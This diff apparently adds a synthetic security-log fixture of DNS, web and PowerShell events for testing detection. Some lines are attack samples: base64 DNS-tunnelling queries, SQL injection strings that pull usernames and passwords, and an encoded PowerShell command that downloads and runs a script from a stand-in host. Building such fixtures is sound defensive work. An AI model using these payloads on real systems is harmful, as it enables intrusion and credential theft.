@@ -1,0 +1,11 @@
+{"ts": "2026-09-22T06:00:01", "event_type": "dns_query", "src_ip": "10.0.0.12", "qname": "updates.cdn.example.net", "qtype": "A"}
+{"ts": "2026-09-22T06:00:04", "event_type": "dns_query", "src_ip": "10.0.0.12", "qname": "mail.example.org", "qtype": "A"}
+{"ts": "2026-09-22T06:05:12", "event_type": "dns_query", "src_ip": "10.0.0.31", "qname": "dGhpcyBpcyBhIGV4ZmlsdHJhdGlvbiBwYXlsb2FkIGNhcnZl", "qtype": "TXT"}
+{"ts": "2026-09-22T06:05:40", "event_type": "dns_query", "src_ip": "10.0.0.31", "qname": "b3RoZXIgY2h1bmsgb2YgZXhmaWx0cmF0aW9uIGRhdGEgZm9sbG93cw", "qtype": "TXT"}
+{"ts": "2026-09-22T06:11:00", "event_type": "web_request", "src_ip": "203.0.113.10", "path": "/index.php?id=42", "status": 200}
+{"ts": "2026-09-22T06:11:31", "event_type": "web_request", "src_ip": "203.0.113.10", "path": "/search?q=shoes", "status": 200}
+{"ts": "2026-09-22T06:19:55", "event_type": "web_request", "src_ip": "198.51.100.7", "path": "/products.php?id=1' UNION SELECT username, password FROM users--", "status": 500}
+{"ts": "2026-09-22T06:20:02", "event_type": "web_request", "src_ip": "198.51.100.7", "path": "/login.php?user=admin' OR '1'='1", "status": 403}
+{"ts": "2026-09-22T07:00:10", "event_type": "windows_event", "host": "ws-finance-02", "provider": "Microsoft-Windows-PowerShell", "event_id": 4104, "command": "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10"}
+{"ts": "2026-09-22T07:14:26", "event_type": "windows_event", "host": "ws-finance-02", "provider": "Microsoft-Windows-PowerShell", "event_id": 4104, "command": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=="}
+{"ts": "2026-09-22T08:30:00", "event_type": "web_request", "src_ip": "10.0.0.12", "path": "/api/orders?page=3", "status": 200}
